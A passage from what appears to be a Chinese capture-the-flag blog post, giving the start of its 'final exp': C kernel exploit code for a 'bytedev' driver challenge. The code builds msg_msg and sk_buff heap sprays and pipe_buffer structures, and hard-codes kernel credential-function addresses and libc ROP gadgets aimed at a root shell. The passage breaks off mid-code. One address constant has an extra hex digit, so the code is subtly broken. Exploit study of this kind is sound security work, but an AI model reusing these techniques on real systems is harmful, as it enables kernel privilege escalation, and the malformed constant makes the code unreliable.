id="FINAL-EXPLOIT"><a href="#FINAL-EXPLOIT" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h2><p>最终的 exp 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;err.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_SIZE 0x1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_SIZE 0x400</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_TYPE    0x41</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_TYPE  0x42</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VICTIM_MSG_TYPE     0x1337</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_TAG     0xAAAAAAAA</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SOCKET_NUM 8</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SK_BUFF_NUM 128</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_NUM 256</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_QUEUE_NUM 4096</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> MSG_COPY</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_COPY 040000</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff81e2d980</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810bb9c04</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED 0xffffffff8224aca0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810bb710</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81a01086</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff811af57d</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BYTEDEV_BUF_SIZE (4096 - sizeof(struct bytedev_data))</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BYTEDEV_MODE_CHANGE 0x114514</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BYTEDEV_BLK_IDX_CHANGE 0x1919810</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BYTEDEV_SECTOR_SIZE 512</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BYTEDEV_SECTOR_NUM 256</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LIBC_SYSTEM 0x50d60</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LIBC_MOV_RSP_RDX_RET 0x5a170</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LIBC_MOV_RDX_PTRRDIADD8_MOV_PTRRSP_RAX_CALL_PTRRDXADD0x20 0x1675b0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LIBC_POP_RDI_RET 0x2a3e5</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LIBC_RET 0x2a3e6</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LIBC_BIN_SH 0x1d8698</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LIBC_PUTS 0x80ed0</span><br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">BYTEDEV_MODE</span> &#123;</span><br>    BYTEDEV_MODE_STREAM = <span class="hljs-number">0</span>,<br>    BYTEDEV_MODE_BLK,<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev_data</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> len, offset;<br>    <span class="hljs-type">char</span> data[<span class="hljs-number">0</span>];<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    prev;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br>    <span class="hljs-type">uint64_t</span>    m_type;<br>    <span class="hljs-type">uint64_t</span>    m_ts;<br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    security;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[PRIMARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>&#125; primary_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span>  &#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[SECONDARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>&#125; secondary_msg;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * skb_shared_info need to take 320 bytes at the tail</span><br><span class="hljs-comment"> * so the max size of buf we should send is:</span><br><span class="hljs-comment"> * 1024 - 320 = 704</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">char</span> fake_second_msg[<span class="hljs-number">704</span>];<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[<span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) \<br>                + <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msgseg)];<br>&#125; oob_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    page;<br>    <span class="hljs-type">uint32_t</span>    offset, len;<br>    <span class="hljs-type">uint64_t</span>    ops;<br>    <span class="hljs-type">uint32_t</span>    flags;<br>    <span class="hljs-type">uint32_t</span>    padding;<br>    <span class="hljs-type">uint64_t</span>    private;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    confirm;<br>    <span class="hljs-type">uint64_t</span>    release;<br>    <span class="hljs-type">uint64_t</span>    try_steal;<br>    <span class="hljs-type">uint64_t</span>    get;<br>&#125;;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\n\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">readMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">writeMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    *(<span class="hljs-type">long</span>*)msgp = msgtyp;<br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">peekMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-type">int</span> __msgsz = msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>);<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, __msgsz, msgtyp, MSG_COPY | IPC_NOWAIT);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">buildMsg</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> msg_msg *msg, <span class="hljs-type">uint64_t</span> m_list_next, <span class="hljs-type">uint64_t</span> m_list_prev, </span><br><span class="hljs-params">              <span class="hljs-type">uint64_t</span> m_type, <span class="hljs-type">uint64_t</span> m_ts,  <span class="hljs-type">uint64_t</span> next, <span class="hljs-type">uint64_t</span> security)</span><br>&#123;<br>    msg-&gt;m_list.next = m_list_next;<br>    msg-&gt;m_list.prev = m_list_prev;<br>    msg-&gt;m_type = m_type;<br>    msg-&gt;m_ts = m_ts;<br>    msg-&gt;next = next;<br>    msg-&gt;security = security;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">spraySkBuff</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++) &#123;<br>            <span class="hljs-keyword">if</span> (write(sk_socket[i][<span class="hljs-number">0</span>], buf, size) &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to spray %d sk_buff for %d socket!&quot;</span>, j, i);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span 